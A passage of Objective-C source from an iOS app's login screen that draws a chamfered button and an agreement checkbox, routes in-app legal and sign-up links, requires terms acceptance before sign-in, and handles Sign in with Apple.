    UIGraphicsBeginImageContextWithOptions(size, NO, 0.0);
    CGFloat cut = 6.0;
    UIBezierPath *outer = [UIBezierPath bezierPath];
    [outer moveToPoint:CGPointMake(cut, 0.0)];
    [outer addLineToPoint:CGPointMake(size.width - cut, 0.0)];
    [outer addLineToPoint:CGPointMake(size.width, cut)];
    [outer addLineToPoint:CGPointMake(size.width, size.height - cut)];
    [outer addLineToPoint:CGPointMake(size.width - cut, size.height)];
    [outer addLineToPoint:CGPointMake(cut, size.height)];
    [outer addLineToPoint:CGPointMake(0.0, size.height - cut)];
    [outer addLineToPoint:CGPointMake(0.0, cut)];
    [outer closePath];
    [[UIColor blackColor] setFill];
    [outer fill];

    CGFloat inset = 2.5;
    UIBezierPath *face = [UIBezierPath bezierPath];
    [face moveToPoint:CGPointMake(cut + 1.0, inset)];
    [face addLineToPoint:CGPointMake(size.width - cut - 1.0, inset)];
    [face addLineToPoint:CGPointMake(size.width - inset, cut + 1.0)];
    [face addLineToPoint:CGPointMake(size.width - inset, size.height - cut - 1.0)];
    [face addLineToPoint:CGPointMake(size.width - cut - 1.0, size.height - inset)];
    [face addLineToPoint:CGPointMake(cut + 1.0, size.height - inset)];
    [face addLineToPoint:CGPointMake(inset, size.height - cut - 1.0)];
    [face addLineToPoint:CGPointMake(inset, cut + 1.0)];
    [face closePath];
    [[UIColor colorWithWhite:0.14 alpha:1.0] setFill];
    [face fill];

    UIImage *image = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    return [image imageWithRenderingMode:UIImageRenderingModeAlwaysOriginal];
}

- (UIImage *)yk_agreeRingImageSelected:(BOOL)selected {
    CGFloat side = 16.0;
    CGSize size = CGSizeMake(side, side);
    UIGraphicsBeginImageContextWithOptions(size, NO, 0.0);

    CGRect ringRect = CGRectInset(CGRectMake(0.0, 0.0, side, side), 1.0, 1.0);
    UIBezierPath *ring = [UIBezierPath bezierPathWithOvalInRect:ringRect];
    ring.lineWidth = 1.6;

    if (selected) {
        [[UIColor colorWithRed:1.0 green:0.45 blue:0.12 alpha:1.0] setFill];
        [ring fill];
        [[UIColor blackColor] setStroke];
        [ring stroke];

        UIBezierPath *check = [UIBezierPath bezierPath];
        check.lineWidth = 1.5;
        check.lineCapStyle = kCGLineCapSquare;
        check.lineJoinStyle = kCGLineJoinMiter;
        [check moveToPoint:CGPointMake(4.2, 8.2)];
        [check addLineToPoint:CGPointMake(6.8, 10.8)];
        [check addLineToPoint:CGPointMake(11.8, 5.2)];
        [[UIColor whiteColor] setStroke];
        [check stroke];
    } else {
        [[UIColor colorWithWhite:1.0 alpha:0.18] setFill];
        [ring fill];
        [[UIColor blackColor] setStroke];
        [ring stroke];
        UIBezierPath *inner = [UIBezierPath bezierPathWithOvalInRect:CGRectInset(ringRect, 0.8, 0.8)];
        inner.lineWidth = 0.8;
        [[UIColor colorWithWhite:1.0 alpha:0.85] setStroke];
        [inner stroke];
    }

    UIImage *image = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    return image;
}

- (void)yk_refreshAgreeRingAppearance {
    UIImage *image = [self yk_agreeRingImageSelected:self.yk_sessionAgreeChecked];
    [self.yk_agreeRingButton setImage:[image imageWithRenderingMode:UIImageRenderingModeAlwaysOriginal]
                             forState:UIControlStateNormal];
}

- (void)yk_setSessionAgreeChecked:(BOOL)checked animated:(BOOL)animated {
    self.yk_sessionAgreeChecked = checked;
    void (^updates)(void) = ^{
        [self yk_refreshAgreeRingAppearance];
        if (animated) {
            self.yk_agreeRingButton.transform = CGAffineTransformMakeScale(0.86, 0.86);
            [UIView animateWithDuration:0.18
                                  delay:0.0
                 usingSpringWithDamping:0.55
                  initialSpringVelocity:0.8
                                options:0
                             animations:^{
                self.yk_agreeRingButton.transform = CGAffineTransformIdentity;
            } completion:nil];
        }
    };
    updates();
}

- (UITextView *)yk_linkTextViewWithText:(NSString *)text
                             linkRanges:(NSArray<NSValue *> *)linkRanges
                                actions:(NSArray<NSString *> *)actions
                              alignment:(NSTextAlignment)alignment {
    UITextView *textView = [[UITextView alloc] init];
    textView.translatesAutoresizingMaskIntoConstraints = NO;
    textView.backgroundColor = UIColor.clearColor;
    textView.textAlignment = alignment;
    textView.scrollEnabled = NO;
    textView.editable = NO;
    textView.delegate = self;
    textView.textContainerInset = UIEdgeInsetsZero;
    textView.textContainer.lineFragmentPadding = 0.0;
    [textView setContentCompressionResistancePriority:UILayoutPriorityRequired
                                              forAxis:UILayoutConstraintAxisHorizontal];
    textView.linkTextAttributes = @{
        NSForegroundColorAttributeName: UIColor.whiteColor,
        NSUnderlineStyleAttributeName: @(NSUnderlineStyleSingle)
    };

    NSMutableParagraphStyle *paragraphStyle = [[NSMutableParagraphStyle alloc] init];
    paragraphStyle.alignment = alignment;
    NSMutableAttributedString *attributedText = [[NSMutableAttributedString alloc] initWithString:text attributes:@{
        NSForegroundColorAttributeName: [UIColor colorWithWhite:1.0 alpha:0.82],
        NSFontAttributeName: [UIFont systemFontOfSize:14.0 weight:UIFontWeightRegular],
        NSParagraphStyleAttributeName: paragraphStyle
    }];

    for (NSInteger index = 0; index < linkRanges.count && index < actions.count; index++) {
        NSRange range = linkRanges[index].rangeValue;
        [attributedText addAttributes:@{
            NSFontAttributeName: [UIFont systemFontOfSize:14.0 weight:UIFontWeightBold],
            NSUnderlineStyleAttributeName: @(NSUnderlineStyleSingle),
            NSLinkAttributeName: actions[index],
            NSForegroundColorAttributeName: UIColor.whiteColor
        } range:range];
    }
    textView.attributedText = attributedText;
    return textView;
}

- (BOOL)textView:(UITextView *)textView
 shouldInteractWithURL:(NSURL *)URL
         inRange:(NSRange)characterRange
     interaction:(UITextItemInteraction)interaction {
    NSString *action = URL.absoluteString;
    if ([action isEqualToString:@"yoka://sign-up"]) {
        [self yk_signUpButtonTapped:nil];
    } else if ([action isEqualToString:@"yoka://user-agreement"]) {
        YKLegalDocViewController *web = [[YKLegalDocViewController alloc] initWithDocumentKind:YKLegalDocumentKindTermsPact];
        web.yk_protocolURL = [YKOfficialSiteBaseURL stringByAppendingString:@"users"];
        [self.navigationController pushViewController:web animated:YES];
    } else if ([action isEqualToString:@"yoka://privacy-policy"]) {
        YKLegalDocViewController *web = [[YKLegalDocViewController alloc] initWithDocumentKind:YKLegalDocumentKindPrivacyPolicy];
        web.yk_protocolURL = [YKOfficialSiteBaseURL stringByAppendingString:@"privacy"];
        [self.navigationController pushViewController:web animated:YES];
    }
    return NO;
}

- (void)yk_agreeRingTapped:(UIButton *)sender {
    if (self.yk_sessionAgreeChecked) {
        [self yk_setSessionAgreeChecked:NO animated:YES];
        return;
    }
    if (![YKLegalAckVault yk_hasAcceptedLicense]) {
        [self yk_presentEulaSheet];
        return;
    }
    [self yk_setSessionAgreeChecked:YES animated:YES];
}

- (void)yk_presentEulaSheet {
    __weak typeof(self) weakSelf = self;
    [YKEulaSheetViewController yk_presentFromViewController:self completion:^(BOOL accepted) {
        if (accepted) {
            [weakSelf yk_setSessionAgreeChecked:YES animated:YES];
        }
    }];
}

- (BOOL)yk_canEnterAuthFlow {
    if (![YKLegalAckVault yk_hasAcceptedLicense]) {
        [self yk_presentEulaSheet];
        return NO;
    }
    if (!self.yk_sessionAgreeChecked) {
        [YKCenterToast yk_showNotice:@"Please agree to the User Agreement and Privacy Policy" inView:self.view];
        return NO;
    }
    return YES;
}

- (void)yk_loginButtonTapped:(UIButton *)sender {
    if (![self yk_canEnterAuthFlow]) {
        return;
    }
    [self.navigationController pushViewController:[[YKSignInViewController alloc] init] animated:YES];
}

- (void)yk_signUpButtonTapped:(UIButton *)sender {
    if (![self yk_canEnterAuthFlow]) {
        return;
    }
    [self.navigationController pushViewController:[[YKSignUpViewController alloc] init] animated:YES];
}

- (void)yk_appleButtonTapped:(UIButton *)sender {
    if (![self yk_canEnterAuthFlow]) {
        return;
    }
    ASAuthorizationAppleIDProvider *provider = [[ASAuthorizationAppleIDProvider alloc] init];
    ASAuthorizationAppleIDRequest *request = [provider createRequest];
    request.requestedScopes = @[ASAuthorizationScopeFullName, ASAuthorizationScopeEmail];
    ASAuthorizationController *controller = [[ASAuthorizationController alloc] initWithAuthorizationRequests:@[request]];
    controller.delegate = self;
    controller.presentationContextProvider = self;
    [controller performRequests];
}

#pragma mark - ASAuthorizationController

- (ASPresentationAnchor)presentationAnchorForAuthorizationController:(ASAuthorizationController *)controller {
    return self.view.window;
}

- (void)authorizationController:(ASAuthorizationController *)controller didCompleteWithAuthorization:(ASAuthorization *)authorization {
    if (![authorization.credential isKindOfClass:ASAuthorizationAppleIDCredential.class]) {
        [YKCenterToast yk_showNotice:@"Apple Sign In failed" inView:self.view];
        return;
    }
    ASAuthorizationAppleIDCredential *credential = (ASAuthorizationAppleIDCredential *)authorization.credential;
    NSString *userId = credential.user;
    NSString *email = credential.email;
    NSString *fullName = [self yk_fullNameFromAppleComponents:credential.fullName];

    __weak typeof(self) weakSelf = self;
    [YKCenterToast yk_showLoadingInView:self.view performAfterDelay:0.55 work:^{
        __strong typeof(weakSelf) self = weakSelf;
        if (!self) { return; }
        NSString *error = nil;
        BOOL ok = [[YKRosterVault sharedRoster] yk_admitAppleWithUserId:userId
                                                                        email:email
                                                                     fullName:fullName
                                                                 errorMessage:&error];
        if (!ok) {
            [YKCenterToast yk_showNotice:error ?: @"Apple Sign In failed" inView:self.view];
            return;
        }
        [YKLaunchSteward yk_proceedPastCredentialFrom:self.navigationController];
    }];
}

/// Apple only returns name components on first authorization; compose a real display name.
- (nullable NSString *)yk_fullNameFromAppleComponents:(NSPersonNameComponents *)components {
    if (!components) {
        return nil;
    }
    NSMutableArray<NSString *> *parts = [NSMutableArray array];
    void (^add)(NSString *) = ^(NSString *piece) {
        NSString *trimmed = [piece stringByTrimmingCharactersInSet:NSCharacterSet.whitespaceAndNewlineCharacterSet];
        if (trimmed.length > 0) {
            [parts addObject:trimmed];
        }
    };
    add(components.namePrefix);
    add(components.givenName);
    add(components.middleName);
    add(components.familyName);
    add(components.nameSuffix);
    if (parts.count > 0) {
        return [parts componentsJoinedByString:@" "];
    }
    NSString *formatted = [NSPersonNameComponentsFormatter localizedStringFromPersonNameComponents:components
                                                                                              style:NSPersonNameComponentsFormatterStyleDefault
                                                                                            options:0];
    formatted = [formatted stringByTrimmingCharactersInSet:NSCharacterSet.whitespaceAndNewlineCharacterSet];
    return formatted.length > 0 ? formatted : nil;
}

- (void)authorizationController:(ASAuthorizationController *)controller didCompleteWithError:(NSError *)error {
    if (error.code == ASAuthorizationErrorCanceled) {
        return;
    }
    [YKCenterToast yk_showNotice:@"Apple Sign In failed" inView:self.view];
}

@end
